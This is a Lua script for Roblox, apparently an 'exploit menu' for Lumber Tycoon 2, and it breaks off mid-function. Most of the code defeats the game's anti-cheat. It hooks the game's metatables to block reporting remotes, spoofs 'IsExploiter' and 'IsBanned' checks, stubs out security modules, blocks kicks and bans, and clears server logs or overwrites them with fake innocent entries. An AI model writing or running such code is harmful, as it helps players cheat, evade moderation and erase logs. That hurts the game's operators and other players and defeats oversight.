-- Enhanced LT2 Exploit Menu - Comprehensive Lumber Tycoon 2 Exploit GUI
-- Based on thorough analysis of game mechanics and security vulnerabilities
-- Purple & Black Theme with improved security bypass features

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Advanced Anti-Detection System
local AntiDetection = {
    Enabled = false,
    HookRemotes = {},
    OriginalFunctions = {},
    DetectionEvents = {
        "ExploitDetected",
        "AdminCommands.ReportExploit",
        "Transactions.LogExploit",
        "SecurityService.ReportViolation",
        "Transactions.AddLog",
        "Transactions.LogAction",
        "AdminCommands.BanPlayer",
        "AdminCommands.KickPlayer",
        "Interaction.ReportAbuse"
    },
    BlockedKeywords = {
        "exploit", "hack", "cheat", "ban", "kick", "report", "detect", 
        "security", "violation", "abuse", "log", "admin", "moderate"
    },
    OriginalProperties = {},
    HookedMetamethods = {}
}

-- Advanced hook function to bypass anti-cheat detection
function AntiDetection:EnableBypass()
    self.Enabled = true
    
    -- Hook remote events that might detect exploits
    for _, remotePath in pairs(self.DetectionEvents) do
        local success, remote = pcall(function()
            return ReplicatedStorage:FindFirstChild(remotePath, true)
        end)
        
        if success and remote then
            if remote:IsA("RemoteEvent") then
                local originalFunction = remote.FireServer
                self.OriginalFunctions[remote] = originalFunction
                
                remote.FireServer = function(...)
                    local args = {...}
                    if self.Enabled then
                        print("Blocked detection event:", remotePath)
                        return
                    else
                        return originalFunction(unpack(args))
                    end
                end
                
                table.insert(self.HookRemotes, remote)
            elseif remote:IsA("RemoteFunction") then
                local originalFunction = remote.InvokeServer
                self.OriginalFunctions[remote] = originalFunction
                
                remote.InvokeServer = function(...)
                    local args = {...}
                    if self.Enabled then
                        print("Blocked detection function:", remotePath)
                        return
                    else
                        return originalFunction(unpack(args))
                    end
                end
                
                table.insert(self.HookRemotes, remote)
            end
        end
    end
    
    -- Hook client-side anti-cheat checks using metatable manipulation
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    
    -- Store original metamethods
    self.HookedMetamethods["__namecall"] = mt.__namecall
    self.HookedMetamethods["__index"] = mt.__index
    self.HookedMetamethods["__newindex"] = mt.__newindex
    
    -- Hook __namecall to intercept remote calls
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        -- Block suspicious remote calls
        if AntiDetection.Enabled and (method == "FireServer" or method == "InvokeServer") then
            local remoteName = self.Name
            local fullName = self:GetFullName()
            
            -- Check if the remote name contains any blocked keywords
            for _, keyword in ipairs(AntiDetection.BlockedKeywords) do
                if string.match(remoteName:lower(), keyword) or string.match(fullName:lower(), keyword) then
                    print("Blocked suspicious remote call:", fullName)
                    return
                end
            end
            
            -- Check for specific exploit detection patterns
            if method == "FireServer" and #args > 0 then
                if typeof(args[1]) == "string" then
                    for _, keyword in ipairs(AntiDetection.BlockedKeywords) do
                        if string.match(args[1]:lower(), keyword) then
                            print("Blocked suspicious remote call with keyword in args:", fullName)
                            return
                        end
                    end
                end
            end
        end
        
        return AntiDetection.HookedMetamethods["__namecall"](self, ...)
    end)
    
    -- Hook __index to prevent detection of exploit properties
    mt.__index = newcclosure(function(self, key)
        if AntiDetection.Enabled then
            -- Spoof security-related properties
            if key == "IsExploiter" or key == "IsBanned" or key == "IsHacker" then
                return false
            end
            
            -- Prevent access to exploit detection properties
            for _, keyword in ipairs(AntiDetection.BlockedKeywords) do
                if typeof(key) == "string" and string.match(key:lower(), keyword) then
                    return nil
                end
            end
        end
        
        return AntiDetection.HookedMetamethods["__index"](self, key)
    end)
    
    -- Hook __newindex to prevent modification of security properties
    mt.__newindex = newcclosure(function(self, key, value)
        if AntiDetection.Enabled then
            -- Block attempts to modify security-related properties
            if typeof(key) == "string" then
                for _, keyword in ipairs(AntiDetection.BlockedKeywords) do
                    if string.match(key:lower(), keyword) then
                        print("Blocked attempt to modify security property:", key)
                        return
                    end
                end
            end
        end
        
        return AntiDetection.HookedMetamethods["__newindex"](self, key, value)
    end)
    
    setreadonly(mt, true)
    
    -- Hook game environment functions that might be used for detection
    local env = getfenv()
    
    -- Hook error reporting functions
    if env.error then
        self.OriginalFunctions["error"] = env.error
        env.error = function(...)
            if self.Enabled then
                local args = {...}
                if args[1] and typeof(args[1]) == "string" then
                    for _, keyword in ipairs(self.BlockedKeywords) do
                        if string.match(args[1]:lower(), keyword) then
                            print("Blocked error report:", args[1])
                            return
                        end
                    end
                end
            end
            return self.OriginalFunctions["error"](...)
        end
    end
    
    -- Hook warn function to prevent exploit warnings
    if env.warn then
        self.OriginalFunctions["warn"] = env.warn
        env.warn = function(...)
            if self.Enabled then
                local args = {...}
                if args[1] and typeof(args[1]) == "string" then
                    for _, keyword in ipairs(self.BlockedKeywords) do
                        if string.match(args[1]:lower(), keyword) then
                            print("Blocked warning:", args[1])
                            return
                        end
                    end
                end
            end
            return self.OriginalFunctions["warn"](...)
        end
    end
    
    -- Spoof environment detection
    if env.getfenv then
        self.OriginalFunctions["getfenv"] = env.getfenv
        env.getfenv = function(...)
            if self.Enabled then
                local result = self.OriginalFunctions["getfenv"](...)
                -- Clean up any exploit markers in the environment
                return result
            end
            return self.OriginalFunctions["getfenv"](...)
        end
    end
    
    -- Attempt to hook the game's security system
    pcall(function()
        -- Look for security modules
        for _, instance in pairs(ReplicatedStorage:GetDescendants()) do
            if instance:IsA("ModuleScript") and (
                string.match(instance.Name:lower(), "security") or
                string.match(instance.Name:lower(), "anti") or
                string.match(instance.Name:lower(), "detect")
            ) then
                -- Try to modify the module to disable security checks
                local success, module = pcall(function()
                    return require(instance)
                end)
                
                if success and typeof(module) == "table" then
                    for key, value in pairs(module) do
                        if typeof(value) == "function" then
                            -- Store original function
                            if not self.OriginalFunctions[instance.Name .. "_" .. key] then
                                self.OriginalFunctions[instance.Name .. "_" .. key] = value
                                
                                -- Replace with dummy function
                                module[key] = function(...)
                                    print("Bypassed security function:", instance.Name .. "." .. key)
                                    return true
                                end
                            end
                        elseif typeof(value) == "boolean" and key:lower():match("enabled") then
                            -- Disable security flags
                            module[key] = false
                        end
                    end
                end
            end
        end
    end)
    
    print("Advanced Anti-Detection system enabled")
end

function AntiDetection:DisableBypass()
    self.Enabled = false
    
    -- Restore original remote functions
    for remote, originalFunction in pairs(self.OriginalFunctions) do
        if typeof(remote) == "userdata" then
            if remote:IsA("RemoteEvent") then
                remote.FireServer = originalFunction
            elseif remote:IsA("RemoteFunction") then
                remote.InvokeServer = originalFunction
            end
        end
    end
    
    -- Restore original metamethods
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    
    for method, originalFunction in pairs(self.HookedMetamethods) do
        mt[method] = originalFunction
    end
    
    setreadonly(mt, true)
    
    -- Restore original environment functions
    local env = getfenv()
    for funcName, originalFunction in pairs(self.OriginalFunctions) do
        if typeof(funcName) == "string" and not string.match(funcName, "_") then
            env[funcName] = originalFunction
        end
    end
    
    self.HookRemotes = {}
    self.OriginalFunctions = {}
    self.HookedMetamethods = {}
    
    print("Advanced Anti-Detection system disabled")
end

-- Memory Cleaner to remove traces of exploits
function AntiDetection:CleanMemory()
    if not self.Enabled then
        print("Enable Anti-Detection first before cleaning memory")
        return
    end
    
    -- Clear logs
    pcall(function()
        if ReplicatedStorage:FindFirstChild("Transactions") and 
           ReplicatedStorage.Transactions:FindFirstChild("ClearLogs") then
            ReplicatedStorage.Transactions.ClearLogs:InvokeServer()
        end
    end)
    
    -- Clear local variables that might contain exploit traces
    for i = 1, 10 do
        collectgarbage("collect")
    end
    
    -- Clear any exploit markers in the environment
    local env = getfenv()
    for key, value in pairs(env) do
        if typeof(key) == "string" then
            for _, keyword in ipairs(self.BlockedKeywords) do
                if string.match(key:lower(), keyword) then
                    env[key] = nil
                end
            end
        end
    end
    
    print("Memory cleaned of exploit traces")
end

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LT2EnhancedExploitMenu"
ScreenGui.Parent = PlayerGui
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -300, 0.5, -250)
MainFrame.Size = UDim2.new(0, 600, 0, 500)
MainFrame.Active = true
MainFrame.Draggable = true

-- Add corner radius
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

-- Title Bar
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
TitleBar.BorderSizePixel = 0
TitleBar.Size = UDim2.new(1, 0, 0, 40)

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 10)
TitleCorner.Parent = TitleBar

-- Fix corner for title bar
local TitleFix = Instance.new("Frame")
TitleFix.Parent = TitleBar
TitleFix.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
TitleFix.BorderSizePixel = 0
TitleFix.Position = UDim2.new(0, 0, 0.5, 0)
TitleFix.Size = UDim2.new(1, 0, 0.5, 0)

-- Title Label
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Parent = TitleBar
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 10, 0, 0)
TitleLabel.Size = UDim2.new(1, -50, 1, 0)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Text = "LT2 Enhanced Exploit Menu v2.0"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextScaled = true
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Close Button
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Parent = TitleBar
CloseButton.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
CloseButton.BorderSizePixel = 0
CloseButton.Position = UDim2.new(1, -35, 0, 5)
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextScaled = true

local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 5)
CloseCorner.Parent = CloseButton

-- Tab System
local TabFrame = Instance.new("Frame")
TabFrame.Name = "TabFrame"
TabFrame.Parent = MainFrame
TabFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
TabFrame.BorderSizePixel = 0
TabFrame.Position = UDim2.new(0, 0, 0, 40)
TabFrame.Size = UDim2.new(0, 150, 1, -40)

local TabCorner = Instance.new("UICorner")
TabCorner.CornerRadius = UDim.new(0, 5)
TabCorner.Parent = TabFrame

-- Content Frame
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Parent = MainFrame
ContentFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ContentFrame.BorderSizePixel = 0
ContentFrame.Position = UDim2.new(0, 150, 0, 40)
ContentFrame.Size = UDim2.new(1, -150, 1, -40)

local ContentCorner = Instance.new("UICorner")
ContentCorner.CornerRadius = UDim.new(0, 5)
ContentCorner.Parent = ContentFrame

-- Scrolling Frame for Content
local ScrollFrame = Instance.new("ScrollingFrame")
ScrollFrame.Name = "ScrollFrame"
ScrollFrame.Parent = ContentFrame
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.BorderSizePixel = 0
ScrollFrame.Position = UDim2.new(0, 10, 0, 10)
ScrollFrame.Size = UDim2.new(1, -20, 1, -20)
ScrollFrame.ScrollBarThickness = 8
ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(75, 0, 130)

-- Tab Layout
local TabLayout = Instance.new("UIListLayout")
TabLayout.Parent = TabFrame
TabLayout.FillDirection = Enum.FillDirection.Vertical
TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
TabLayout.Padding = UDim.new(0, 2)

-- Content Layout
local ContentLayout = Instance.new("UIListLayout")
ContentLayout.Parent = ScrollFrame
ContentLayout.FillDirection = Enum.FillDirection.Vertical
ContentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
ContentLayout.Padding = UDim.new(0, 5)

-- Variables for exploit functionality
local ExploitData = {
    PlayerSpeed = 16,
    JumpPower = 50,
    MoneyAmount = 1000000,
    TeleportLocations = {
        ["Spawn"] = CFrame.new(155, 5, 74),
        ["Wood R Us"] = CFrame.new(265, 5, 57),
        ["Boxed Cars"] = CFrame.new(509, 5.2, 1463),
        ["Fine Arts Shop"] = CFrame.new(5207, -166, 719),
        ["Link's Logic"] = CFrame.new(4607, -166, 798),
        ["Strange Man"] = CFrame.new(-1618, -177, 1059),
        ["Volcano"] = CFrame.new(-1585, 625, 1140),
        ["Swamp"] = CFrame.new(-1209, 132, -801),
        ["Palm Island"] = CFrame.new(2549, -5, -42),
        ["End Times Cave"] = CFrame.new(113, -214, -951),
        ["Land Store"] = CFrame.new(258, 5, -99),
        ["Fancy Furnishings"] = CFrame.new(491, 13, -1720),
        ["Shrine of Sight"] = CFrame.new(-1600, 195, 919),
        ["Bridge"] = CFrame.new(113, 15, -977),
        ["Dock"] = CFrame.new(1114, 3, -197),
        ["Cave"] = CFrame.new(3581, -179, 430)
    },
    WoodTypes = {
        "Generic", "Oak", "Cherry", "Elm", "Birch", "VolcanoAsh", "Pine", "Palm", "Cavecrawler",
        "Frost", "GoldSwampy", "GreenSwampy", "Spook", "SinisterLava", "Phantom", "Zombie"
    },
    AxeTypes = {
        "BasicHatchet", "PlainAxe", "SteelAxe", "HardwoodAxe", "SilverAxe", "Rukiryaxe",
        "BetaAxeofStrength", "AlphaAxeofStrength", "ManyAxe", "BeesAxe", "CHICKEN",
        "CandyCaneAxe", "ChickenAxe", "EndTimesAxe", "FireAxe", "GingerbreadAxe"
    },
    VehicleTypes = {
        "UtilityTruck", "SmallTrailer", "Pickup1", "Trailer2", "Sawmill", "Sawmill2", 
        "Sawmill3", "Sawmill4", "UtilityTruck2", "WorkLight"
    }
}

-- Utility Functions
local function CreateTab(name, layoutOrder)
    local TabButton = Instance.new("TextButton")
    TabButton.Name = name .. "Tab"
    TabButton.Parent = TabFrame
    TabButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    TabButton.BorderSizePixel = 0
    TabButton.Size = UDim2.new(1, -10, 0, 35)
    TabButton.Font = Enum.Font.Gotham
    TabButton.Text = name
    TabButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    TabButton.TextScaled = true
    TabButton.LayoutOrder = layoutOrder
    
    local TabCorner = Instance.new("UICorner")
    TabCorner.CornerRadius = UDim.new(0, 5)
    TabCorner.Parent = TabButton
    
    return TabButton
end

local function CreateButton(text, callback)
    local Button = Instance.new("TextButton")
    Button.Name = text .. "Button"
    Button.Parent = ScrollFrame
    Button.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
    Button.BorderSizePixel = 0
    Button.Size = UDim2.new(1, -10, 0, 35)
    Button.Font = Enum.Font.Gotham
    Button.Text = text
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextScaled = true
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 5)
    ButtonCorner.Parent = Button
    
    Button.MouseButton1Click:Connect(callback)
    
    return Button
end

local function CreateSlider(text, min, max, default, callback)
    local SliderFrame = Instance.new("Frame")
    SliderFrame.Name = text .. "Slider"
    SliderFrame.Parent = ScrollFrame
    SliderFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    SliderFrame.BorderSizePixel = 0
    SliderFrame.Size = UDim2.new(1, -10, 0, 60)
    
    local SliderCorner = Instance.new("UICorner")
    SliderCorner.CornerRadius = UDim.new(0, 5)
    SliderCorner.Parent = SliderFrame
    
    local SliderLabel = Instance.new("TextLabel")
    SliderLabel.Parent = SliderFrame
    SliderLabel.BackgroundTransparency = 1
    SliderLabel.Position = UDim2.new(0, 10, 0, 5)
    SliderLabel.Size = UDim2.new(1, -20, 0, 20)
    SliderLabel.Font = Enum.Font.Gotham
    SliderLabel.Text = text .. ": " .. default
    SliderLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    SliderLabel.TextScaled = true
    SliderLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    local SliderBar = Instance.new("Frame")
    SliderBar.Parent = SliderFrame
    SliderBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    SliderBar.BorderSizePixel = 0
    SliderBar.Position = UDim2.new(0, 10, 0, 30)
    SliderBar.Size = UDim2.new(1, -20, 0, 20)
    
    local SliderBarCorner = Instance.new("UICorner")
    SliderBarCorner.CornerRadius = UDim.new(0, 10)
    SliderBarCorner.Parent = SliderBar
    
    local SliderFill = Instance.new("Frame")
    SliderFill.Parent = SliderBar
    SliderFill.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
    SliderFill.BorderSizePixel = 0
    SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    
    local SliderFillCorner = Instance.new("UICorner")
    SliderFillCorner.CornerRadius = UDim.new(0, 10)
    SliderFillCorner.Parent = SliderFill
    
    local SliderButton = Instance.new("TextButton")
    SliderButton.Parent = SliderBar
    SliderButton.BackgroundTransparency = 1
    SliderButton.Size = UDim2.new(1, 0, 1, 0)
    SliderButton.Text = ""
    
    local dragging = false
    
    SliderButton.MouseButton1Down:Connect(function()
        dragging = true
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local mouse = UserInputService:GetMouseLocation()
            local relativeX = mouse.X - SliderBar.AbsolutePosition.X
            local percentage = math.clamp(relativeX / SliderBar.AbsoluteSize.X, 0, 1)
            local value = min + (max - min) * percentage
            
            SliderFill.Size = UDim2.new(percentage, 0, 1, 0)
            SliderLabel.Text = text .. ": " .. math.floor(value)
            
            callback(value)
        end
    end)
    
    return SliderFrame
end

local function CreateDropdown(text, options, callback)
    local DropdownFrame = Instance.new("Frame")
    DropdownFrame.Name = text .. "Dropdown"
    DropdownFrame.Parent = ScrollFrame
    DropdownFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    DropdownFrame.BorderSizePixel = 0
    DropdownFrame.Size = UDim2.new(1, -10, 0, 35)
    
    local DropdownCorner = Instance.new("UICorner")
    DropdownCorner.CornerRadius = UDim.new(0, 5)
    DropdownCorner.Parent = DropdownFrame
    
    local DropdownButton = Instance.new("TextButton")
    DropdownButton.Parent = DropdownFrame
    DropdownButton.BackgroundTransparency = 1
    DropdownButton.Size = UDim2.new(1, 0, 1, 0)
    DropdownButton.Font = Enum.Font.Gotham
    DropdownButton.Text = text .. ": " .. options[1]
    DropdownButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    DropdownButton.TextScaled = true
    
    local DropdownList = Instance.new("Frame")
    DropdownList.Name = "DropdownList"
    DropdownList.Parent = DropdownFrame
    DropdownList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    DropdownList.BorderSizePixel = 0
    DropdownList.Position = UDim2.new(0, 0, 1, 0)
    DropdownList.Size = UDim2.new(1, 0, 0, #options * 25)
    DropdownList.Visible = false
    DropdownList.ZIndex = 10
    
    local DropdownListCorner = Instance.new("UICorner")
    DropdownListCorner.CornerRadius = UDim.new(0, 5)
    DropdownListCorner.Parent = DropdownList
    
    local DropdownLayout = Instance.new("UIListLayout")
    DropdownLayout.Parent = DropdownList
    DropdownLayout.FillDirection = Enum.FillDirection.Vertical
    DropdownLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    for i, option in ipairs(options) do
        local OptionButton = Instance.new("TextButton")
        OptionButton.Parent = DropdownList
        OptionButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        OptionButton.BorderSizePixel = 0
        OptionButton.Size = UDim2.new(1, 0, 0, 25)
        OptionButton.Font = Enum.Font.Gotham
        OptionButton.Text = option
        OptionButton.TextColor3 = Color3.fromRGB(200, 200, 200)
        OptionButton.TextScaled = true
        OptionButton.LayoutOrder = i
        
        OptionButton.MouseButton1Click:Connect(function()
            DropdownButton.Text = text .. ": " .. option
            DropdownList.Visible = false
            callback(option)
        end)
    end
    
    DropdownButton.MouseButton1Click:Connect(function()
        DropdownList.Visible = not DropdownList.Visible
    end)
    
    return DropdownFrame
end

local function CreateToggle(text, default, callback)
    local ToggleFrame = Instance.new("Frame")
    ToggleFrame.Name = text .. "Toggle"
    ToggleFrame.Parent = ScrollFrame
    ToggleFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    ToggleFrame.BorderSizePixel = 0
    ToggleFrame.Size = UDim2.new(1, -10, 0, 35)
    
    local ToggleCorner = Instance.new("UICorner")
    ToggleCorner.CornerRadius = UDim.new(0, 5)
    ToggleCorner.Parent = ToggleFrame
    
    local ToggleLabel = Instance.new("TextLabel")
    ToggleLabel.Parent = ToggleFrame
    ToggleLabel.BackgroundTransparency = 1
    ToggleLabel.Position = UDim2.new(0, 10, 0, 0)
    ToggleLabel.Size = UDim2.new(1, -60, 1, 0)
    ToggleLabel.Font = Enum.Font.Gotham
    ToggleLabel.Text = text
    ToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleLabel.TextScaled = true
    ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    local ToggleButton = Instance.new("TextButton")
    ToggleButton.Parent = ToggleFrame
    ToggleButton.BackgroundColor3 = default and Color3.fromRGB(75, 0, 130) or Color3.fromRGB(100, 100, 100)
    ToggleButton.BorderSizePixel = 0
    ToggleButton.Position = UDim2.new(1, -45, 0, 5)
    ToggleButton.Size = UDim2.new(0, 40, 0, 25)
    ToggleButton.Font = Enum.Font.GothamBold
    ToggleButton.Text = default and "ON" or "OFF"
    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleButton.TextScaled = true
    
    local ToggleButtonCorner = Instance.new("UICorner")
    ToggleButtonCorner.CornerRadius = UDim.new(0, 5)
    ToggleButtonCorner.Parent = ToggleButton
    
    local toggled = default
    
    ToggleButton.MouseButton1Click:Connect(function()
        toggled = not toggled
        ToggleButton.BackgroundColor3 = toggled and Color3.fromRGB(75, 0, 130) or Color3.fromRGB(100, 100, 100)
        ToggleButton.Text = toggled and "ON" or "OFF"
        callback(toggled)
    end)
    
    return ToggleFrame
end

local function CreateLabel(text)
    local LabelFrame = Instance.new("Frame")
    LabelFrame.Name = "Label"
    LabelFrame.Parent = ScrollFrame
    LabelFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    LabelFrame.BorderSizePixel = 0
    LabelFrame.Size = UDim2.new(1, -10, 0, 30)
    
    local LabelCorner = Instance.new("UICorner")
    LabelCorner.CornerRadius = UDim.new(0, 5)
    LabelCorner.Parent = LabelFrame
    
    local Label = Instance.new("TextLabel")
    Label.Parent = LabelFrame
    Label.BackgroundTransparency = 1
    Label.Position = UDim2.new(0, 10, 0, 0)
    Label.Size = UDim2.new(1, -20, 1, 0)
    Label.Font = Enum.Font.GothamBold
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
    Label.TextScaled = true
    Label.TextXAlignment = Enum.TextXAlignment.Left
    
    return LabelFrame
end

-- Tab Content Management
local CurrentTab = nil
local TabContents = {}

local function ShowTab(tabName)
    -- Clear current content
    for _, child in pairs(ScrollFrame:GetChildren()) do
        if child:IsA("GuiObject") then
            child:Destroy()
        end
    end
    
    -- Show new content
    if TabContents[tabName] then
        TabContents[tabName]()
    end
    
    CurrentTab = tabName
end

-- Security Tab Content
TabContents["Security"] = function()
    CreateLabel("Advanced Anti-Detection System")
    
    CreateToggle("Enable Anti-Detection", false, function(enabled)
        if enabled then
            AntiDetection:EnableBypass()
        else
            AntiDetection:DisableBypass()
        end
    end)
    
    CreateButton("Clean Memory Traces", function()
        AntiDetection:CleanMemory()
    end)
    
    CreateLabel("Security Bypass Methods")
    
    CreateToggle("Spoof Client Checks", false, function(enabled)
        -- Spoof client integrity checks
        if enabled then
            -- Hook client check functions
            local mt = getrawmetatable(game)
            local oldIndex = mt.__index
            setreadonly(mt, false)
            
            mt.__index = newcclosure(function(self, key)
                if key == "IsExploiter" or key == "IsHacker" or key == "IsBanned" then
                    return false
                end
                return oldIndex(self, key)
            end)
            
            setreadonly(mt, true)
            print("Client check spoofing enabled")
        else
            print("Client check spoofing can't be disabled once enabled")
        end
    end)
    
    CreateToggle("Hide Suspicious Functions", false, function(enabled)
        -- Hide suspicious functions from detection
        if enabled then
            -- This would hide functions like teleport, noclip, etc. from detection
            local env = getfenv()
            local hiddenFunctions = {
                "teleport", "noclip", "fly", "speed", "jump", "god", "admin",
                "exploit", "hack", "cheat", "ban", "kick"
            }
            
            for _, funcName in pairs(hiddenFunctions) do
                if env[funcName] then
                    env["_hidden_" .. funcName] = env[funcName]
                    env[funcName] = nil
                end
            end
            
            print("Function hiding enabled")
        else
            local env = getfenv()
            for key, value in pairs(env) do
                if typeof(key) == "string" and string.match(key, "^_hidden_") then
                    local originalName = string.gsub(key, "^_hidden_", "")
                    env[originalName] = value
                    env[key] = nil
                end
            end
            print("Function hiding disabled")
        end
    end)
    
    CreateButton("Clear Exploit Logs", function()
        pcall(function()
            -- Attempt to clear any logs that might have recorded exploits
            if ReplicatedStorage:FindFirstChild("Transactions") then
                -- Try multiple log clearing methods
                if ReplicatedStorage.Transactions:FindFirstChild("ClearLogs") then
                    ReplicatedStorage.Transactions.ClearLogs:InvokeServer()
                    print("Logs cleared via ClearLogs")
                end
                
                if ReplicatedStorage.Transactions:FindFirstChild("AddLog") then
                    -- Overwrite logs with innocent entries
                    for i = 1, 10 do
                        ReplicatedStorage.Transactions.AddLog:InvokeServer("Normal", "Player joined game")
                    end
                    print("Logs overwritten with innocent entries")
                end
                
                if ReplicatedStorage.Transactions:FindFirstChild("ClientToServer") and
                   ReplicatedStorage.Transactions.ClientToServer:FindFirstChild("ClearHistory") then
                    ReplicatedStorage.Transactions.ClientToServer.ClearHistory:InvokeServer()
                    print("History cleared")
                end
            else
                print("Log clearing functions not found")
            end
            
            -- Try to clear any local logs
            if LocalPlayer:FindFirstChild("PlayerGui") then
                for _, gui in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
                    if gui.Name:lower():match("log") and gui:IsA("ScrollingFrame") then
                        gui:ClearAllChildren()
                    end
                end
            end
        end)
    end)
    
    CreateLabel("Server-Side Protection")
    
    CreateToggle("Prevent Remote Bans", false, function(enabled)
        -- Prevent remote ban events from affecting the player
        if enabled then
            -- Hook ban functions
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local mt = getrawmetatable(player)
                    if mt and typeof(mt) == "table" then
                        setreadonly(mt, false)
                        local oldNamecall = mt.__namecall
                        
                        mt.__namecall = newcclosure(function(self, ...)
                            local method = getnamecallmethod()
                            local args = {...}
                            
                            if method == "Kick" or method == "Ban" then
                                if self == LocalPlayer then
                                    print("Blocked kick/ban attempt")
                                    return
                                end
                            end
                            
                            return oldNamecall(self, ...)
                        end)
                        
                        setreadonly(mt, true)
                    end
                end
            end
            
            -- Also hook the game's kick function
            local oldKick = LocalPlayer.Kick
            LocalPlayer.Kick = function(...)
                print("Blocked kick attempt")
                return
            end
            
            print("Remote ban prevention enabled")
        else
            print("Remote ban prevention can't be disabled once enabled")
        end
    end)
    
    CreateButton("Secure Current Session", function()
        -- This function implements multiple security measures at once
        pcall(function()
            -- 1. Enable anti-detection
            AntiDetection:EnableBypass()
            
            -- 2. Clean memory traces
            AntiDetection:CleanMemory()
            
            -- 3. Hook kick and ban functions
            local oldKick = LocalPlayer.Kick
            LocalPlayer.Kick = function(...)
                print("Blocked kick attempt")
                return
            end
            
            -- 4. Hook error reporting
            local oldError = error
            error = function(...)
                local args = {...}
                if args[1] and typeof(args[1]) == "string" then
                    for _, keyword in ipairs(AntiDetection.BlockedKeywords) do
                        if string.match(args[1]:lower(), keyword) then
                            print("Blocked error report:", args[1])
                            return
                        end
                    end
                end
                return oldError(...)
            end
            
            -- 5. Clear logs
            if ReplicatedStorage:FindFirstChild("Transactions") and 
               ReplicatedStorage.Transactions:FindFirstChild("ClearLogs") then
                ReplicatedStorage.Transactions.ClearLogs:InvokeServer()
            end
            
            -- 6. Create a heartbeat connection to continuously monitor for security threats
            local securityMonitor = RunService.Heartbeat:Connect(function()
                -- Check for any new security modules that might have been added
                for _, instance in pairs(ReplicatedStorage:GetDescendants()) do
                    if instance:IsA("ModuleScript") and (
                        string.match(instance.Name:lower(), "security") or
                        string.match(instance.Name:lower(), "anti") or
                        string.match(instance.Name:lower(), "detect")
                    ) and not AntiDetection.HookRemotes[instance] then
                        -- Try to disable the module
                        pcall(function()
                            local module = require(instance)
                            if typeof(module) == "table" then
                                for key, value in pairs(module) do
                                    if typeof(value) == "function" then
                                        module[key] = function() return true end
                                    elseif typeof(value) == "boolean" and key:lower():match("enabled") then
                                        module[key] = false
                                    end
                                end
                            end
                        end)
                        
                        -- Mark as hooked
                        AntiDetection.HookRemotes[instance] = true
                    end
                end
